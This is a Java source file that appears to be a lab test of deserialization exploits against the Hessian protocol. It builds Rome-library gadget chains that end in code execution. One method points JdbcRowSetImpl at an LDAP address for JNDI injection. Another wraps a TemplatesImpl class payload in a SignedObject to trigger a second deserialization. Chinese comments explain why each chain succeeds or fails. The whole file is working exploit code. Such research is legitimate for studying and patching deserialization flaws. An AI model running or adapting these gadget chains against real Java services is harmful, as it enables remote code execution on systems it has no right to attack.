package com.test.gadget;

import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import tools.HessianTools;
import tools.ReflectTools;
import tools.TemplatesGen;

import javax.xml.transform.Templates;
import java.security.*;
import java.util.HashMap;
import java.util.Map;

public class RomeBased {
    public static void main(String[] args) throws Exception {
        rome2SignedObj("2");
    }

    public static void rome2Jndi() throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("ldap://127.0.0.1:50389/eae633");

        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
        HashMap<Object, Object> hashMap = ReflectTools.makeMap(equalsBean, "any");

        byte[] bytes = HessianTools.hessianSer2bytes(hashMap, "2");
        HessianTools.hessianDeser(bytes, "2");
    }

    // 二次反序列化
    // 会触发三次，因为ToStringBean.printProperty间接触发两次EqualsBean.hashCode
    public static void rome2SignedObj(String version) throws Exception {
        Templates templates = TemplatesGen.getTemplates1(null, "D:/1tmp/classes/CalcAbs.class");
        ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
        HashMap<Object, Object> hashMap = ReflectTools.makeMap(equalsBean, "any");

        // 初始化 SignedObject 所需的密钥和签名工具
        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        // 创建 SignedObject 对象，对 map 进行签名
        SignedObject signedObject = new SignedObject(hashMap, privateKey, signingEngine);


        ToStringBean toStringBean2 = new ToStringBean(SignedObject.class, signedObject);
        EqualsBean equalsBean2 = new EqualsBean(ToStringBean.class, toStringBean2);
        Map<Object, Object> hashMap2 = ReflectTools.makeMap(equalsBean2, "any");

        byte[] bytes = HessianTools.hessianSer2bytes(hashMap2, "2");
        HessianTools.hessianDeser(bytes, "2");
    }


    // 失败，因为hessian无法反序列化transit和static变量
    public static void rome2Templates() throws Exception {
        Templates templates = TemplatesGen.getTemplates1(null, "D:/1tmp/classes/Calc.class");
        ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
//        equalsBean.hashCode();
        HashMap<Object, Object> hashMap = ReflectTools.makeMap(equalsBean, "any");

        byte[] bytes = HessianTools.hessianSer2bytes(hashMap, "1");
        HessianTools.hessianDeser(bytes, "1");
    }
}
